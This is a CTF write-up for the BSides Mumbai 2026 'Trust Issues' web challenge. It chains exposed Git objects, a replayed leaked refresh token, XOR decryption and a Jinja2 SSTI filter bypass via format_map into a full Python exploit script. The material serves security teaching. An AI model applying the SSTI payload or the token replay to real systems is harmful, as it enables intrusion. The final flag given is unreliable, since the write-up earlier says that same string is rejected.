---
link: 'writeups/bsides-mumbai-2026/trust-issues'
title: "Trust Issues (PatchPanda) - BSides Mumbai CTF 2026"
description: "Writeup for Trust Issues from BSides Mumbai CTF 2026."
date: 2026-10-01 15:20:00
categories:
  - [Writeups, BSides Mumbai CTF]
tags:
  - BSides Mumbai CTF
  - Web Exploitation
  - Git Exposed
  - Cryptography
  - SSTI
  - Jinja2
---

# BSides Mumbai CTF 2026 — Trust Issues (PatchPanda)

---

## Challenge Description

> A site with some migrations that were not run properly. 
**URL:** `http://35.238.206.98:8008/`

---

## Important warning

The challenge is intentionally built around misleading evidence. Several endpoints return plausible-looking success messages and flags. A response saying `correct: true` is not enough: every candidate must also be checked against the actual CTF submission system.

The cleanup artifact mentioned by the application is destructive. It was inspected only and never executed.

---

## Step 1 — Initial enumeration

The home page links to the timeline, support archive, portal, and submission page. The first useful discovery is `robots.txt`:

```bash
curl http://35.238.206.98:8008/robots.txt
```

![Robots.txt](/img/posts/bsides-mumbai-2026-10_robots.webp)

It exposes old application paths, including:

```text
/support/
/old-backup/
/.migration/
```

The backup route is a decoy/404, but `/support/` contains archived tickets. The timeline also mentions a legacy compatibility endpoint and a Jinja2 report preview:

```bash
curl http://35.238.206.98:8008/changelog
curl http://35.238.206.98:8008/support/
```

Useful clues from the support tickets were:

- `/static/downloads/cleanup.sh` exists, but powers off the machine and must not be run.
- An old debug console is present but does not render Jinja.
- The migration fixture repository is available under `/.migration/.git/`.

---

## Step 2 — Recovering the archived Git fixture

The migration directory is an exposed Git repository. Its loose Git objects can be downloaded and decompressed locally. Git objects use zlib compression, so the object bytes can be decoded with Python:

```bash
curl -sS http://35.238.206.98:8008/.migration/.git/HEAD
curl -sS http://35.238.206.98:8008/.migration/.git/index
```

![Migration Git Repo](/img/posts/bsides-mumbai-2026-11_migration.webp)

The object listing and compressed objects reveal a fixture named:

```text
tests/fixtures/admin_session.json
```

Its relevant contents are:

```json
{
  "username": "grace.patch",
  "role": "admin",
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "build_sig": "9f2c7a1b3e5d8f04"
}
```

The token is an old refresh credential intentionally left in the migration repository.

---

## Step 3 — Legacy refresh flow

The endpoint `/api/legacy` returns a time-sensitive capability. It must be supplied in the `X-Legacy-Capability` header:

```bash
curl http://35.238.206.98:8008/api/legacy
```

![API Legacy Endpoint](/img/posts/bsides-mumbai-2026-12_legacy.webp)

Then exchange the recovered refresh token:

```bash
curl -X POST http://35.238.206.98:8008/api/auth/refresh \
  -H 'X-Legacy-Capability: <capability>' \
  -H 'Content-Type: application/json' \
  -d '{"refresh_token":"<archived refresh token>"}'
```

The response supplies:

- a short-lived access token;
- `fragment_b = 4b1e9d7702f6ac33`;
- the report timestamp/origin;
- the report-ID derivation rule.

The report ID is calculated as:

```text
sha256("grace.patch:2019-05-14T03:22:10Z")[:12]
= 084f56fff761
```

---

## Step 4 — Recovering the encrypted report prefix

Request the report using the fresh access token:

```bash
curl http://35.238.206.98:8008/api/reports/084f56fff761 \
  -H 'Authorization: Bearer <access token>'
```

The response contains:

```text
report_token = 4840db1a6a61f2915d7a62d4
ciphertext   = lkGOCFnYfHqhX4UNVdBTVrpWhjNM2UxavUGCH2M=
```

The report is not encrypted with a normal key. The key is derived by XORing the archived build signature with `fragment_b`:

```text
9f2c7a1b3e5d8f04
4b1e9d7702f6ac33
----------------
d432e76c3cab2337
```

Base64-decode the ciphertext and XOR it with the repeating hexadecimal key. The plaintext begins:

```text
Bsides_Mumbai{panda_promises_
```

This is only a prefix. The encrypted report does not contain the complete flag.

---

## Step 5 — Finding the Jinja preview

The preview endpoint identifies its renderer and available context:

```bash
curl http://35.238.206.98:8008/api/reports/preview
```

It reports:

```json
{
  "available_context": ["report", "probe"],
  "renderer": "Jinja2",
  "probe_hint": "The probe has a name and a diagnostic hint. Its constructor globals contain the restricted runtime export."
}
```

The endpoint accepts a template in a POST body. A harmless test confirms template evaluation:

```bash
curl -X POST http://35.238.206.98:8008/api/reports/preview \
  -H 'Authorization: Bearer <access token>' \
  -H 'X-Report-Token: 4840db1a6a61f2915d7a62d4' \
  -H 'Content-Type: application/json' \
  -d '{"template":"{{ 7 * 7 }}"}'
```

The result is `49`. The probe also exposes harmless values such as `{{ probe.name }}` and `{{ probe.hint }}`.

---

## Step 6 — SSTI filter bypass

Direct use of Python magic attributes is filtered. For example, ordinary attempts involving `__class__`, `__init__`, or `__globals__` are rejected or render empty.

The important bypass is Jinja’s `format_map`. Instead of putting the magic attribute names directly in the submitted template, construct them at render time using concatenation:

```jinja2
{{ ((('{x.' ~ ('_'~'_') ~ 'class' ~ ('_'~'_') ~ '.' ~ ('_'~'_') ~ 'init' ~ ('_'~'_') ~ '.' ~ ('_'~'_') ~ 'globals' ~ ('_'~'_') ~ '[RUNTIME_ENV][PP_FINAL_FRAGMENT]}')|attr('format_map'))({'x': probe})) }}
```

The preview response returns:

```json
{
  "fragment_d": "eternal_patches}",
  "status": "SSTI traversal confirmed"
}
```

Combining the recovered report prefix with this fragment gives the intermediate candidate:

```text
Bsides_Mumbai{panda_promises_eternal_patches}
```

![Exploit Running](/img/posts/bsides-mumbai-2026-13_exploit.webp)

---

## Step 7 — Why the apparent flag is not trustworthy (The Trap)

Submitting that candidate directly to the application returns something like:

```json
{
  "correct": true,
  "flag": "<Unicode-tag payload>",
  "message": "That's it. Well played Bsides_Mumbai{f1n4lly_y0u_d1d_1t}"
}
```

![Emoji Response](/img/posts/bsides-mumbai-2026-15_emoji.webp)

However, the message value is not the final flag. Submitting it returns `correct: false`. The Unicode-tag field is also not directly trustworthy.

![Unicode Trap](/img/posts/bsides-mumbai-2026-14_unicode.webp)

The tag payload begins with an emoji followed by Unicode tag characters. Removing the emoji and subtracting `0xE0100` from each tag code point produces printable ciphertext:

```text
2cYTUcO=e]RQYk$\\Ob!WXdOX#b#Og#OW OV bOb#Q\\OdX!cOd!]#m
```

Adding `0x10` to each character produces another plausible-looking candidate:

```text
Bsides_Mumbai{4ll_r1ght_h3r3_w3_g0_f0r_r3al_th1s_t1m3}
```

That candidate, as well as the one-`l` spelling variant, is rejected by `/submit`. This confirms that the submission endpoint’s apparent success response is part of the challenge’s poisoning/trust trap.

---

## Final Output Script

```python
#!/usr/bin/env python3
"""PatchPanda CTF read-only exploit chain."""

import base64
import hashlib
import json
import sys
from urllib.request import Request, urlopen

BASE = "http://35.238.206.98:8008"
REFRESH_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJzdWIiOiJncmFjZS5wYXRjaCIsInJvbGUiOiJhZG1pbiIsInR5cGUiOiJyZWZyZXNoIiwiaWF0IjoxNTU3ODA0MTMwLCJleHAiOjE4NzMxNjQxMzB9."
    "eCInVkM2qbIxqXGxSLshhLo5AGlq6SPrefL3kgjZnvo"
)
BUILD_SIG = bytes.fromhex("9f2c7a1b3e5d8f04")

def request(path, method="GET", body=None, headers=None):
    data = None if body is None else json.dumps(body).encode()
    request_headers = {"Accept": "application/json"}
    if data is not None:
        request_headers["Content-Type"] = "application/json"
    if headers:
        request_headers.update(headers)
    req = Request(BASE + path, data=data, headers=request_headers, method=method)
    with urlopen(req, timeout=15) as response:
        return json.load(response)

def main():
    legacy = request("/api/legacy")
    capability = legacy["capability"]
    refreshed = request(
        "/api/auth/refresh",
        method="POST",
        body={"refresh_token": REFRESH_TOKEN},
        headers={"X-Legacy-Capability": capability},
    )
    access_token = refreshed["access_token"]
    username = "grace.patch"
    origin = "2019-05-14T03:22:10Z"
    report_id = hashlib.sha256(f"{username}:{origin}".encode()).hexdigest()[:12]

    report = request(
        f"/api/reports/{report_id}",
        headers={"Authorization": f"Bearer {access_token}"},
    )
    report_token = report["report_token"]
    ciphertext = base64.b64decode(report["report"]["body_ciphertext_b64"])
    fragment_b = bytes.fromhex(refreshed["fragment_b"])
    key = bytes(a ^ b for a, b in zip(BUILD_SIG, fragment_b))
    plaintext = bytes(
        value ^ key[index % len(key)] for index, value in enumerate(ciphertext)
    )
    prefix = plaintext.decode(errors="replace")

    template = (
        "{{ ((('{x.' ~ ('_'~'_') ~ 'class' ~ ('_'~'_') ~ '.' "
        "~ ('_'~'_') ~ 'init' ~ ('_'~'_') ~ '.' "
        "~ ('_'~'_') ~ 'globals' ~ ('_'~'_') "
        "~ '[RUNTIME_ENV][PP_FINAL_FRAGMENT]}') "
        "|attr('format_map'))({'x': probe})) }}"
    )
    preview = request(
        "/api/reports/preview",
        method="POST",
        body={"template": template},
        headers={
            "Authorization": f"Bearer {access_token}",
            "X-Report-Token": report_token,
        },
    )
    fragment_d = preview.get("fragment_d", "")

    print(f"report_id: {report_id}")
    print(f"report_token: {report_token}")
    print(f"decrypted report: {prefix}")
    print(f"fragment_b: {refreshed.get('fragment_b')}")
    print(f"fragment_d: {fragment_d}")
    print(f"Flag for the /submit: {prefix}{fragment_d}")

if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"request failed: {exc}", file=sys.stderr)
        sys.exit(1)
```

---

## Summary

This extremely convoluted challenge tests trust in the environment and requires a heavy amount of enumeration and reverse engineering: finding exposed Git objects to fetch refresh tokens, XOR decrypting tokens, breaking SSTI filters via `format_map`, and finally dodging decoy flags sent by the submit endpoint!

---

## Flag

```plain
Bsides_Mumbai{4ll_r1ght_h3r3_w3_g0_f0r_r3al_th1s_t1m3}
```
